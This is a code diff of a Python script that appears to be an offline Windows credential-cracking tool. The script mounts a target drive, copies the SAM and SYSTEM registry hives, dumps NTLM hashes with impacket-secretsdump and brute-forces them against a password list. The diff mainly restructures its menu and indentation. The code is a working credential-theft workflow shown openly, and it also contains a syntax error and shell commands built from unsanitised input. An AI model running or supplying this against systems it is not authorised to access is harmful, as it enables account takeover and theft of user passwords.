@@ -29,56 +29,48 @@ def animal():
         else:
             return False
 
-    choice = input("Enter (Y) Create Disk Image (N) Continue: ")
 
-    if choice == "Y":
-        clone()
-    elif choice == "N":
-        os.chdir("/mnt/")
-        directory = input("Confirm Name of Your Directory: ")
-        print("..............................................") 
-        subprocess.call("sudo fdisk -l")
-        print("..............................................")
-        windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
-        subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
-        subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
-        subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
-        subprocess.call("sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL > targethashes.txt", shell=True)
-        subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
-        subprocess.call("sudo nano targethashes.txt", shell=True)
+    os.chdir("/mnt/")
+    directory = input("Confirm Name of Your Directory: ")
+    print("..............................................") 
+    subprocess.call("sudo fdisk -l")
+    print("..............................................")
+    windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
+    subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
+    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
+    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
+    subprocess.call("sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL > targethashes.txt", shell=True)
+    subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
+    subprocess.call("sudo nano targethashes.txt", shell=True)
 
-        with open("targethashes.txt"), "r") as input_file:
-            input_hash = input_file.readline()
+    with open("targethashes.txt"), "r") as input_file:
+        input_hash = input_file.readline()
 
-        with open(input("Enter Path to Your Password List: "), "r", errors="ignore") as password_list:
+    with open(input("Enter Path to Your Password List: "), "r", errors="ignore") as password_list:
         
-            for line in password_list:
-                if cracked:
-                    break
-
-                else:
-                    password_guess = line.rstrip()
-                    ntlm_hash = coverted_ntlm(password_guess)
-
-                    print(f"GUESSES: {guesses}", end="\r")
-
-                    if match_hashes(input_hash, ntlm_hash):
-                        cracked = True
-
-                    guesses += 1
-
+        for line in password_list:
             if cracked:
-                print(f"PASSWORD FOUND: {password_guess}")
-                subprocess.call("sudo rm -f targethashes.txt", shell=True)
-            
+                break
+
             else:
-                print(f"NO PASSWORD FOUND OUT OF {guesses} GUESSES")
-                subprocess.call("sudo rm -f targethashes.txt", shell=True)
-                subprocess.call("sudo umount " + windows_harddrive, shell=True) 
-    else:
-        print("")
-        print("INVALID INPUT EXITING")
-        quit()
+                password_guess = line.rstrip()
+                ntlm_hash = coverted_ntlm(password_guess)
+
+                print(f"GUESSES: {guesses}", end="\r")
+
+                if match_hashes(input_hash, ntlm_hash):
+                    cracked = True
+
+                guesses += 1
+
+        if cracked:
+            print(f"PASSWORD FOUND: {password_guess}")
+            subprocess.call("sudo rm -f targethashes.txt", shell=True)
+            
+        else:
+            print(f"NO PASSWORD FOUND OUT OF {guesses} GUESSES")
+            subprocess.call("sudo rm -f targethashes.txt", shell=True)
+            subprocess.call("sudo umount " + windows_harddrive, shell=True) 
 
 def main():
     try:
@@ -89,12 +81,15 @@ def main():
         print("DELETE THE OTHER USER HASHES, SAVE AND THEN EXIT NANO")
         print("YOU NEED A EMPTY DIRECTORY IN /mnt/ TO CONTINUE")
         print("")
-        choice = input("(Y) Make New Directory (N) Continue: ")
+        choice = input("(Y) Make New Directory (C) Clone Drive (N) Continue: ")
         if choice == "Y":
             mkdir()
             animal()
         elif choice == "N":
             animal()
+        elif choice == "C":
+            clone()
+            main()
         else:
             print("")
             print("INVALID INPUT EXITING")
